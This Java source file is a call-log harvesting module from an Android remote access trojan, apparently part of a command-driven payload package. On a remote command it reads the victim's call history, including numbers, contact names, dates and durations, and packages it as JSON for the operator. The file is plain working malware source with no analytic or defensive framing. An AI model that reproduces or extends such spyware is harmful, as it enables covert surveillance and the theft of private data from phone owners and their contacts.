package com.rat.payload.modules;

import android.content.Context;
import android.database.Cursor;
import android.provider.CallLog;

import org.json.JSONArray;
import org.json.JSONObject;

public class CallLogModule implements CommandHandler.Command {

    private Context context;

    public CallLogModule(Context ctx) {
        this.context = ctx.getApplicationContext();
    }

    @Override
    public JSONObject execute(JSONObject args) {
        JSONObject result = new JSONObject();
        JSONArray calls = new JSONArray();
        try {
            int limit = args.optInt("limit", 100);
            Cursor cursor = context.getContentResolver().query(
                CallLog.Calls.CONTENT_URI,
                null, null, null,
                CallLog.Calls.DATE + " DESC LIMIT " + limit
            );
            if (cursor != null) {
                while (cursor.moveToNext()) {
                    JSONObject call = new JSONObject();
                    call.put("number", cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.NUMBER)));
                    call.put("type", cursor.getInt(cursor.getColumnIndexOrThrow(CallLog.Calls.TYPE)));
                    call.put("date", cursor.getLong(cursor.getColumnIndexOrThrow(CallLog.Calls.DATE)));
                    call.put("duration", cursor.getInt(cursor.getColumnIndexOrThrow(CallLog.Calls.DURATION)));
                    call.put("name", cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.CACHED_NAME)));
                    calls.put(call);
                }
                cursor.close();
            }
            result.put("calls", calls);
            result.put("count", calls.length());
        } catch (Exception e) {
            try { result.put("error", e.getMessage()); } catch (Exception ignored) {}
        }
        return result;
    }
}
